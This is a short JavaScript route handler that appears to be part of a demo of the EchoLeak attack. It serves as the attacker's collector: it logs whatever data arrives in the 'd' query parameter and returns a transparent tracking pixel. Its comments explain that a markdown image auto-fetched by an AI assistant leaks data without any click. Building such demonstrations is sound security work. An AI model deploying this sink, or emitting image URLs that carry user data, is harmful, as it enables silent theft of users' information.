// THE ATTACKER'S COLLECTOR. In a real attack this lives on the attacker's server;
// here it's the same app so the demo is self-contained. It records whatever arrives
// in the query string (the exfiltrated data) and returns a 1x1 transparent GIF, so
// the victim's browser "loads the image" and nothing looks broken.
//
// This is the EchoLeak exfiltration sink: a URL that leaks data simply by being
// auto-fetched when the markdown image renders. No click. No consent.
//
// ponytail: the in-memory buffer below is shared across requests within ONE running
// process — perfect for local `npm run dev` (our primary demo/rehearsal path). On
// Vercel's serverless functions there is no shared memory, so the live capture PANEL
// there needs a tiny KV store (a documented Phase-3 add-on). The LEAK itself works
// anywhere; only the on-page display needs shared state.

const captures = globalThis.__captures ?? (globalThis.__captures = []);

// 1x1 transparent GIF
const PIXEL = Buffer.from(
  "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7",
  "base64"
);

export async function GET(req) {
  const data = new URL(req.url).searchParams.get("d");
  if (data) {
    captures.unshift({ at: new Date().toISOString(), data });
    if (captures.length > 50) captures.pop();
    console.log("🚨 EXFILTRATION CAPTURED:", data.slice(0, 300));
  }
  return new Response(PIXEL, {
    headers: { "Content-Type": "image/gif", "Cache-Control": "no-store" },
  });
}
